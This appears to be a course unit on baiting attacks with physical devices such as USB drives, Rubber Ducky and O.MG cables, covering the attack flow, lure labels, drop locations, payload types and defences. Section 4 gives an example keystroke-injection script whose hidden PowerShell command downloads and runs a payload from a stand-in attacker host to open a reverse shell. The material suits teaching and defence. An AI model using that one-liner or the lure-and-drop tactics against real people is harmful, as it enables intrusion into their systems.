# Unit 5: Physical Social Engineering — Topic 5: Baiting

## Overview

**Baiting** is a social engineering technique that uses a tempting item — typically a physical device like a USB drive — to lure victims into compromising their systems or networks. The "bait" exploits human curiosity and greed: people who find an interesting-looking USB drive, CD, or other device often plug it into their computer to see what's on it, unknowingly executing malicious payloads.

---

## 1. How Baiting Works

```
BAITING ATTACK FLOW:

PREPARATION:
  ┌─────────────────────────────────┐
  │ 1. Prepare malicious device     │
  │ 2. Load payload                 │
  │ 3. Label device enticingly      │
  │ 4. Select drop location         │
  └─────────────────────────────────┘
              │
              ▼
PLACEMENT:
  ┌─────────────────────────────────┐
  │ 1. Drop device in target area   │
  │ 2. Parking lot, break room,     │
  │    lobby, restroom, sidewalk    │
  │ 3. Make it look accidentally    │
  │    dropped or forgotten         │
  └─────────────────────────────────┘
              │
              ▼
VICTIM FINDS DEVICE:
  ┌─────────────────────────────────┐
  │ 1. Curiosity: "What's on this?" │
  │ 2. Helpfulness: "Whose is this?"│
  │ 3. Greed: "Free USB drive!"     │
  │ 4. Plugs into computer          │
  └─────────────────────────────────┘
              │
              ▼
PAYLOAD EXECUTES:
  ┌─────────────────────────────────┐
  │ 1. Auto-run malware             │
  │ 2. HID (keyboard) attack        │
  │ 3. Opens malicious document     │
  │ 4. Reverse shell / beacon       │
  │ 5. Credential harvester         │
  └─────────────────────────────────┘
```

---

## 2. Types of Baiting Devices

```
USB DRIVES:
  → Most common baiting device
  → Can contain malware files
  → Can emulate keyboard (HID attack)
  → Labeled enticingly to encourage insertion
  → Cheap and disposable

USB RUBBER DUCKY:
  → Looks like normal USB drive
  → Acts as a keyboard (HID device)
  → Types pre-programmed commands
  → Executes in seconds
  → Bypasses most AV (it's a "keyboard")

BASH BUNNY:
  → Advanced attack platform
  → Multiple attack modes
  → Ethernet adapter emulation
  → Storage + HID + network
  → Multi-stage attacks

O.MG CABLE:
  → Looks like normal charging cable
  → Contains hidden Wi-Fi implant
  → Acts as HID device
  → Remote command execution
  → Nearly undetectable

MALICIOUS CDs/DVDs:
  → Less common now
  → Auto-run capabilities
  → Labeled as something interesting
  → "Company Salary Report 2024"

MALICIOUS CHARGERS:
  → "Juice jacking" — data theft while charging
  → USB chargers with data lines active
  → Can install malware on mobile devices
  → Public charging stations can be compromised
```

---

## 3. Effective Baiting Labels and Placement

```
LABELS THAT TRIGGER CURIOSITY:

HIGH EFFECTIVENESS:
  → "Confidential — Salary Review 2024"
  → "Employee Termination List"
  → "Executive Bonuses Q4"
  → "Layoff Plans — DO NOT DISTRIBUTE"
  → "Private Photos"

MEDIUM EFFECTIVENESS:
  → "Company Presentation"
  → "[Person's Name]'s USB"
  → "Project [Name] — Backup"
  → "IT Department — Recovery"
  → No label (plain curiosity)

DROP LOCATIONS:

HIGHEST SUCCESS RATE:
  → Company parking lot (near target's car)
  → Lobby/reception area
  → Break room / kitchen
  → Restroom counter
  → Conference room

MODERATE SUCCESS RATE:
  → Elevator
  → Hallway floor
  → Desk of unoccupied workspace
  → Near printer/copier

EXTERNAL:
  → Sidewalk near building entrance
  → Coffee shop near target company
  → Public transit station used by employees

RESEARCH FINDINGS:
  → University of Illinois study: 48% of dropped 
    USB drives were plugged in
  → First connection: within 6 minutes of finding
  → Labeled drives plugged in more often
  → Parking lot had highest pickup rate
```

---

## 4. USB Attack Payloads

```
PAYLOAD TYPES:

AUTO-RUN MALWARE:
  → autorun.inf triggers execution
  → Mostly blocked by modern OS
  → Still works on some configurations
  → Relies on user clicking files

HID ATTACKS (Rubber Ducky):
  → Opens command prompt/PowerShell
  → Types commands at high speed
  → Downloads and executes payload
  → Can happen in < 5 seconds
  → Bypasses antivirus

EXAMPLE RUBBER DUCKY SCRIPT:
  DELAY 1000
  GUI r                         ← Open Run dialog
  DELAY 500
  STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
  ENTER                         ← Execute command
  → Total time: ~3 seconds
  → Downloads and runs reverse shell
  → Hidden window — user sees nothing

DOCUMENT-BASED:
  → Word/Excel with macros
  → "Enable Content" prompt
  → Macro downloads malware
  → PDF with embedded JavaScript
  → HTML files with credential harvesting

BOOTABLE MEDIA:
  → Boot from USB to bypass OS security
  → Access unencrypted hard drives
  → Extract password hashes
  → Install backdoors
  → Copy sensitive files
```

---

## 5. Defending Against Baiting

```
TECHNICAL CONTROLS:
  → Disable USB ports (Group Policy)
  → USB device whitelisting
  → Endpoint detection and response (EDR)
  → Block auto-run functionality
  → Application whitelisting
  → Full disk encryption (prevents boot attacks)

POLICY CONTROLS:
  → "Found USB" policy — turn in to security
  → Never plug in unknown devices
  → USB usage policy and approval process
  → Incident reporting procedures
  → Regular policy reminders

AWARENESS TRAINING:
  → Demonstrate USB attacks (safely)
  → Show how quick HID attacks are
  → Baiting simulation exercises
  → "If you find it, don't plug it in"
  → Explain what Rubber Ducky does

PHYSICAL CONTROLS:
  → USB port locks/blockers
  → Kiosk mode for public computers
  → Epoxy-filled USB ports on sensitive systems
  → Air-gapped systems for critical infrastructure
  → Supervised computer access areas
```

---

## Summary Table

| Device | Attack Type | Speed | Detection | Success Rate |
|--------|-----------|-------|-----------|-------------|
| USB drive (files) | Malware delivery | Slow (user must open) | AV may detect | 30-48% |
| Rubber Ducky | HID keyboard | 3-5 seconds | Hard to detect | High |
| Bash Bunny | Multi-vector | 5-15 seconds | Hard to detect | Very High |
| O.MG Cable | Remote HID | On demand | Nearly impossible | Very High |
| Malicious CD | Auto-run | Medium | AV may detect | Low (declining) |

---

## Revision Questions

1. What psychological principles make baiting attacks effective?
2. What are the different types of baiting devices and their capabilities?
3. What labels and locations produce the highest baiting success rates?
4. How does a USB Rubber Ducky attack work?
5. What combination of controls provides the best defense against baiting?

---

*Previous: [04-shoulder-surfing.md](04-shoulder-surfing.md) | Next: [06-physical-security-bypass.md](06-physical-security-bypass.md)*

---

*[Back to README](../README.md)*
